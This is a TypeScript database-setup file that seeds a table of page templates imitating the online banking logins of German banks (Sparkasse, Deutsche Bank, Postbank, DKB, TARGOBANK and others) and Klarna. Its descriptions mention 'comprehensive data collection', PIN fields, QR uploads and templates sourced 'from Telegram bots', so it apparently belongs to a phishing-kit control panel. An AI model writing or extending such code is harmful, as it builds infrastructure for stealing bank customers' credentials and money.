import SQLiteDatabase from 'better-sqlite3';

export function initTemplateTable(db: ReturnType<typeof SQLiteDatabase>): void {
  // Create templates table
  db.exec(`
    CREATE TABLE IF NOT EXISTS templates (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      name TEXT NOT NULL UNIQUE,
      folder_name TEXT NOT NULL UNIQUE,
      is_active BOOLEAN NOT NULL DEFAULT 0,
      description TEXT,
      logo_path TEXT,
      template_type TEXT NOT NULL DEFAULT 'bank',
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
      last_modified TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
  `);

  // Add template_type column if it doesn't exist (for existing databases)
  try {
    db.exec(`ALTER TABLE templates ADD COLUMN template_type TEXT NOT NULL DEFAULT 'bank'`);
    console.log('Added template_type column to existing templates table');
    
    // Update existing Klarna template to be a landing page
    db.prepare(`UPDATE templates SET template_type = 'landing_page' WHERE folder_name = 'klarna'`).run();
    console.log('Updated Klarna template to landing_page type');
  } catch (error) {
    // Column already exists, just update Klarna if needed
    try {
      db.prepare(`UPDATE templates SET template_type = 'landing_page' WHERE folder_name = 'klarna' AND template_type = 'bank'`).run();
    } catch (updateError) {
      // Ignore if update fails
    }
  }
  
  // Check if we have the default templates, if not add them
  const templateCount = db.prepare('SELECT COUNT(*) as count FROM templates').get() as { count: number };
  
  // Also check specifically for templates that may have been added later
  const klarnaExists = db.prepare('SELECT COUNT(*) as count FROM templates WHERE folder_name = ?').get('klarna') as { count: number };
  const creditLandingExists = db.prepare('SELECT COUNT(*) as count FROM templates WHERE folder_name = ?').get('credit-landing') as { count: number };
  const targobankExists = db.prepare('SELECT COUNT(*) as count FROM templates WHERE folder_name = ?').get('targobank') as { count: number };
  
  if (templateCount.count === 0 || klarnaExists.count === 0 || creditLandingExists.count === 0 || targobankExists.count === 0) {
    const defaultTemplates = [
      // BANK TEMPLATES - ONLY IMPLEMENTED TEMPLATES
      
      // Original 3 templates
      { name: 'Commerzbank', folder_name: 'commerzbank', is_active: true, description: 'Commerzbank online banking template with multi-step verification', template_type: 'bank' },
      { name: 'Santander', folder_name: 'santander', is_active: true, description: 'Santander online banking template with comprehensive data collection', template_type: 'bank' },
      { name: 'Apobank', folder_name: 'apobank', is_active: true, description: 'Apobank online banking template for healthcare professionals', template_type: 'bank' },
      
      // New templates from Telegram bots - ALL FULLY IMPLEMENTED
      { name: 'Sparkasse', folder_name: 'sparkasse', is_active: true, description: 'Sparkasse template with branch selection and regional banking', template_type: 'bank' },
      { name: 'Postbank', folder_name: 'postbank', is_active: true, description: 'Postbank template with double login and QR code verification', template_type: 'bank' },
      { name: 'DKB', folder_name: 'dkb', is_active: true, description: 'DKB template with modern dark theme and simplified flow', template_type: 'bank' },
      { name: 'Volksbank', folder_name: 'volksbank', is_active: true, description: 'Volksbank template with branch selection and QR upload', template_type: 'bank' },
      { name: 'comdirect', folder_name: 'comdirect', is_active: true, description: 'comdirect investment banking template', template_type: 'bank' },
      { name: 'Consorsbank', folder_name: 'consorsbank', is_active: true, description: 'Consorsbank template with simplified broker flow', template_type: 'bank' },
      { name: 'ING-DiBa', folder_name: 'ingdiba', is_active: true, description: 'ING-DiBa template with transaction cancellation flow', template_type: 'bank' },
      { name: 'Deutsche Bank', folder_name: 'deutsche_bank', is_active: true, description: 'Deutsche Bank template with multi-field login (Filiale/Konto/PIN)', template_type: 'bank' },
      
      // New bank template - TARGOBANK
      { name: 'TARGOBANK', folder_name: 'targobank', is_active: true, description: 'TARGOBANK online banking template with QR upload and full verification flow', template_type: 'bank' },
      
      // LANDING PAGE TEMPLATES
      { name: 'Klarna Gateway', folder_name: 'klarna', is_active: true, description: 'Klarna payment gateway with bank selection and unified data collection', template_type: 'landing_page' },
      { name: 'Klarna Kreditkarte', folder_name: 'credit-landing', is_active: true, description: 'Klarna Kreditkarte - Sofortige Genehmigung mit vereinfachtem Antragsprozess', template_type: 'landing_page' }
    ];
    
    const insertStmt = db.prepare(`
      INSERT OR IGNORE INTO templates (name, folder_name, is_active, description, template_type)
      VALUES (?, ?, ?, ?, ?)
    `);
    
    let insertedCount = 0;
    for (const template of defaultTemplates) {
      const result = insertStmt.run(template.name, template.folder_name, template.is_active ? 1 : 0, template.description, template.template_type);
      if (result.changes > 0) {
        insertedCount++;
        console.log(`✅ Created template: ${template.name} (${template.folder_name})`);
      }
    }
    
    console.log(`Created ${insertedCount} default templates`);
  }
}
